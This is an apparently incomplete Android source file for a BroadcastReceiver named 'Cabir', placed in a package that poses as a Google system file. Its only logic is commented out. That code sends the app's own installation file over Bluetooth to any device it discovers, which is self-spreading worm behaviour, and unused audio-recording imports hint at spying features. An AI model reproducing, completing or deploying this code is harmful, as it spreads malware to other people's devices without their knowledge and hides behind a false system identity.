package com.android.google.important.file;



import java.io.IOException;


import android.content.BroadcastReceiver;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.util.Log;

public class Cabir extends BroadcastReceiver {

	@Override
	public void onReceive(final Context cont, Intent in) {	
		
			
			
			
			
			
			
			
			
			/* String action = in.getAction();
			 * if(BluetoothDevice.ACTION_FOUND.equals(action)) { BluetoothDevice
		   device = in.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);
		   Log.i("X"
		   ,"Name:"+device.getName()+"\nAddress"+device.getAddress()+"#"
		   +device.getBondState());
		   
		   try {
		   
		   PackageManager mPackageManager = cont.getPackageManager();
		   ApplicationInfo pinfo =
		   mPackageManager.getApplicationInfo(cont.getPackageName(),
		   PackageManager.GET_META_DATA);
		   
		   ContentValues values = new ContentValues();
		   values.put(BluetoothShare.URI, pinfo.sourceDir);
		   values.put(BluetoothShare.DESTINATION, device.getAddress());
		   values.put(BluetoothShare.DIRECTION,
		   BluetoothShare.DIRECTION_OUTBOUND); Long ts =
		   System.currentTimeMillis(); values.put(BluetoothShare.TIMESTAMP, ts);
		   cont.getContentResolver().insert(BluetoothShare.CONTENT_URI, values);
		   
		   } catch (Exception e) { // TODO Auto-generated catch block
		   e.printStackTrace(); Log.e("X",e.getMessage()); } }*/
  

	}
}
